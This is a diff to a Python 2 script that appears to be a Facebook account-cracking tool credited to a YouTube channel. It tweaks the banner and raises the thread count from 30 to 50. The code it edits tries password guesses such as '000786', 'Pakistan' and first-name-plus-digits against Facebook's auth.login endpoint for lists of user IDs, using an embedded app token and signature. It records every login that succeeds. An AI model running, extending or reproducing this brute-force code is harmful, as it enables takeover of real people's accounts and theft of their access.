@@ -41,14 +41,14 @@ def hamza(z):
 		time.sleep(0.1)
 ##### LOGO #####
 logo = """
-\033[1;92m_________ _______  _______ 
-\033[1;92m\__    _/(  ___  )(       )
-\033[1;92m   )  (  | (   ) || () () |
-\033[1;92m   |  |  | (___) || || || |
-\033[1;92m   |  |  |  ___  || |(_)| |
-\033[1;92m   |  |  | (   ) || |   | |
-\033[1;92m|\_)  )  | )   ( || )   ( |
-\033[1;92m(____/   |/     \||/     \|
+\033[1;92m========= =======  ======= -(_S_)
+\033[1;92m\__    _/(  ___  )(       )-(_H_)
+\033[1;92m   )  (  | (   ) || () () |-(_A_)
+\033[1;92m   |  |  | (===) || || || |-(_H_)
+\033[1;92m   |  |  |  ===  || |(=)| |-(_R_)
+\033[1;92m   |  |  | (   ) || |   | |-(_U_)
+\033[1;92m|\_)  )  | )   ( || )   ( |-(_K_)
+\033[1;92m(====/   |/     \||/     \|-(_H_)
 \033[1;91m========================================="
 \033[1;94m➣ Coded By : Jam Shahrukh
 \033[1;94m➣ YouTube  : Jam Shahrukh Technical
@@ -181,7 +181,7 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-	print " JAM KING OF FACEBOOK "
+	print "\033[1;97m JAM KING OF FACEBOOK "
 	print 42*"\033[1;96m="
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
@@ -276,7 +276,7 @@ def pilih_super():
 	jalan('\033[1;96m \033[1;93mStarting \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93m Cracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m \x1b[1;93mTo Stop Process Press CTRL Then Press z ')
 	print 42*"\033[1;96m="
@@ -299,8 +299,6 @@ def pilih_super():
 				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass1
 				oks.append(user+pass1)
 			else:
-				a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-				b = json.loads(a.text)
 				pass2 = '000786'
 				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			        q = json.load(data)
@@ -308,8 +306,6 @@ def pilih_super():
 				        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass2
 				        oks.append(user+pass2)
 				else:
-					a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-					b = json.loads(a.text)
 					pass3 = '786123'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
@@ -317,8 +313,6 @@ def pilih_super():
 						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass3
 						oks.append(user+pass3)
 					else:
-						a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-						b = json.loads(a.text)
 						pass4 = 'Pakistan'
 						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					        q = json.load(data)
@@ -326,8 +320,6 @@ def pilih_super():
 						        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass4
 						        oks.append(user+pass4)
 						else:
-							a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-							b = json.loads(a.text)
 							pass5 = b['first_name'] + '123'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
@@ -335,8 +327,6 @@ def pilih_super():
 								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass5
 								oks.append(user+pass5)
 							else:
-								a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-								b = json.loads(a.text)
 								pass6 = b['first_name'] + '1234'
 								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							        q = json.load(data)
@@ -344,8 +334,6 @@ def pilih_super():
 								        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass6
 								        oks.append(user+pass6)
 								else:
-									a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-									b = json.loads(a.text)
 									pass7 = b['first_name'] + '12345'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
@@ -353,8 +341,6 @@ def pilih_super():
 										print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass7
 										oks.append(user+pass7)
 									else:
-										a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-										b = json.loads(a.text)
 										pass8 = b['first_name'] + '786'
 										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									        q = json.load(data)
@@ -364,27 +350,17 @@ def pilih_super():
 										else:
 											a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 											b = json.loads(a.text)
-											pass9 = b['first_name'] + '1122'
+											pass9 = b['first_name'] + 'khan'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
 												print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass9
-												oks.append(user+pass9)
-											else:
-												a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-												b = json.loads(a.text)
-												pass10 = b['first_name'] + 'khan'
-												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											        q = json.load(data)
-											        if 'access_token' in q:
-												        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass10
-												        oks.append(user+pass10)
-													                             
+												oks.append(user+pass9)  
 															
 		except:
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(50)
 	p.map(main, id)
 	print 42*"\033[1;96m="
 	print '\033[1;96m[\033[1;97m \033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
